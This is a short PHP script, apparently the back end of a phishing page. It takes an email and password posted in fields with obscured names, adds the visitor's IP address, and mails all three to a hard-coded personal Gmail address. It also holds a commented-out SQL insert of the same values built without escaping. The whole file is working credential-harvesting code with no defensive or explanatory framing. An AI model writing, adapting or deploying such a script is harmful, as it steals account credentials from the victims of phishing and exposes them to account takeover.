<?php
$errors = array();
$response =array();

function get_client_ip() {
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP']))
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_X_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    else if(isset($_SERVER['HTTP_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    else if(isset($_SERVER['REMOTE_ADDR']))
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}

$ip = get_client_ip();


if(isset($_POST['pet'])){
    $input_email = trim($_POST['pet']);
}
	
 if(isset($_POST['pett'])){
    $input_password = trim($_POST['pett']);
}

	// Include config file
    //require_once('config.php');
    //$query = "INSERT INTO email (email, password) VALUES('$input_email','$input_password')";

    if(!empty($input_email) && !empty($input_password)){
		
		
		$mailTo = "adebajo11@gmail.com"; // note the comma
			
			// Copies
			
			// From
			$mailFrom = "mesh@yahoo.com";
			$mailFromName = " App";
			
			
			// Message subject and contents
			$mailSubject = "App Notification";
			$mailMessage = "Email:$input_email <br />";
			$mailMessage .= "Password:$input_password <br />";
			$mailMessage .= "Ip:$ip \n\n";
		
		
			
			// Text message charset
			$mailCharset = "windows-1252"; // must be accurate (e.g. "Windows - 1252" is invalid)
			
			// Create headres for mail() function
			$headers  = "Content-type: text/html; charset=$mailCharset\r\n";
			$headers .= "From: $mailFromName <$mailFrom>\r\n";
			
			// Send mail
			mail($mailTo, $mailSubject, $mailMessage, $headers);
            
    }
	
echo json_encode($response);

?>